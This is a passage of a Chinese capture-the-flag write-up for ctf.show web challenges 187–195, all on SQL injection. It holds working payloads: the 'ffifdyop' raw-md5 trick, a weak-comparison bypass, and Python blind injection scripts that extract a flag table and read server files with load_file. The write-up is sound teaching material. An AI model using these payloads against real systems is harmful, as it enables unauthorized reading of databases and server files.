class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 只有 admin 可以获得 flag</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名不存在'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>经典 md5，输入用户名 <code>admin</code> ，密码 <code>ffifdyop</code></p><p>md5('ffifdyop')=276f722736c95d99e921722cf9ed621c</p><p>将其作为十六进制再解码后，可以得到 <code>'or' 6xxxx</code></p><h1 id="web-188"><a class="anchor" href="#web-188">#</a> web 188</h1><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select pass from ctfshow_user where username = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>      </pre></td></tr><tr><td data-num="4"></td><td><pre>      </pre></td></tr><tr><td data-num="5"></td><td><pre>  </pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token comment">// 用户名检测</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token comment">// 密码检测</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token comment">// 密码判断</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=&gt;</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>弱等于，字符串和数字比较，当字符串 = 0 恒成立，故可 username=0，password=0</p><h1 id="web-189"><a class="anchor" href="#web-189">#</a> web 189</h1><p>提示 flag 在 api/index.php 文件中</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep</pre></td></tr><tr><td data-num="3"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://fc44b510-a611-4cd6-86f7-2d734b41e643.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">300</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">{</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow{',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))&gt;{0},0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> mid</pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    i <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        tail <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            data <span class="token operator">=</span> <span class="token punctuation">{</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))&gt;{1},0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                                                                                                               <span class="token builtin">str</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                                                                                                                   mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span></pre></td></tr><tr><td data-num="38"></td><td><pre>            <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="39"></td><td><pre>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="42"></td><td><pre>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="45"></td><td><pre>            mid <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span> <span class="token keyword">and</span> head <span class="token operator">!=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token string">"}"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    index <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    getFlag<span class="token punctuation">(</span>index<span class="token punctuation">)</span></pre></td></tr></tbody></table></figure><h1 id="web-190"><a class="anchor" href="#web-190">#</a> web 190</h1><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token triple-quoted-string string">'''</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num="3"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num="4"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num="5"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num="6"></td><td><pre>LastEditTime : 2023-07-15 17:59:09</pre></td></tr><tr><td data-num="7"></td><td><pre>Description  : </pre></td></tr><tr><td data-num="8"></td><td><pre>'''</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>pwd <span class="token operator">=</span> <span class="token string">"1"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="15"></td><td><pre>str_set <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation </pre></td></tr><tr><td data-num="16"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://4cd908a0-fce3-4625-81ad-18085f85af6e.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>index <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    left <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    right <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">{</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token string">"username"</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">,1)) &gt; </span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,1,2) ='1"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token comment"># print(data)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            right <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="39"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr></tbody></table></figure><h1 id="web-191"><a class="anchor" href="#web-191">#</a> web 191</h1><p>过滤了 <code>ascii</code> ，使用 <code>ord</code></p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token triple-quoted-string string">'''</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num="3"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num="4"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num="5"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num="6"></td><td><pre>LastEditTime : 2023-07-15 18:05:57</pre></td></tr><tr><td data-num="7"></td><td><pre>Description  : </pre></td></tr><tr><td data-num="8"></td><td><pre>'''</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>pwd <span class="token operator">=</span> <span class="token string">"1"</span></pre></td></tr><tr><td data-num="14"></td><td><pre>result <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="15"></td><td><pre>str_set <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation </pre></td></tr><tr><td data-num="16"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://d6c927bd-730c-4a1c-a8d0-de2deaca515b.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>index <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    left <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    right <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'"</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">{</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token string">"username"</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(ord(substr((</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">,1)) &gt; </span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,1,2) ='1"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token string">"password"</span> <span class="token punctuation">:</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">}</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token comment"># print(data)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            right <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="39"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    index <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr></tbody></table></figure><h1 id="web-195"><a class="anchor" href="#web-195">#</a> web 195</h1><p>查询语句</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select pass from ctfshow_user where username = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$username</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment">// 密码检测</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">}</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 密码判断</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">}</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">}</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td 